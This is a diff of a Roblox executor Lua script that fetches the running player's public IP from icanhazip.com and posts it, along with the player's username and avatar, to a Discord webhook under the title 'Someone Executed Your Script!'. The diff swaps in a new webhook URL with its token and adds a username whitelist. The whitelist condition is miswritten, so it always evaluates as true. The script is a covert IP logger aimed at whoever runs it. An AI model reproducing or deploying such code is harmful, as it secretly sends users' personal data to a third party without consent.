@@ -1,3 +1,8 @@
+if game.Players.LocalPlayer.Name == "zzotac" or "Mihajlo42Savic"  then
+    print("not logged")
+else
+    
+
 local ip = tostring(game:HttpGet("https://icanhazip.com/", true))
 
 local webhookcheck =
@@ -8,9 +13,9 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1041250957973000243/9KoItEmeQxfA5MAEMEOz-P4Xi_ARDFEiGkcvfefia4KjULMeVxJ_9LVu5J-AgS_OKBC9"
+   "https://discord.com/api/webhooks/1042816261945577543/lb0zj-7D70MTF1HizN8NpXIrMN8fVhHez3Z7qh8IzEJGDyHwdfM9JOYW7GC1C8Au6OIq"
 local data = { 
-   ["content"] = "Userip : "..ip.."",
+   ["content"] = "Userip : ".. ip .."",
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
@@ -18,7 +23,7 @@ local data = {
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
-               ["url"] = "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.houseandgarden.co.uk%2Fgallery%2Flesser-known-autumn-flowers-to-grow&psig=AOvVaw2Uu78GJoc8esYGSzUcaY5c&ust=1668409972968000&source=images&cd=vfe&ved=0CA8QjRxqFwoTCOj6ndDNqvsCFQAAAAAdAAAAABAE" ..
+               ["url"] = "https://tr.rbxcdn.com/bb40a155fdbf66ce270783878be7cea1/150/150/AvatarHeadshot/Png" ..
                    tostring(game:GetService("Players").LocalPlayer.Name)
            }
        }
@@ -32,3 +37,4 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+end
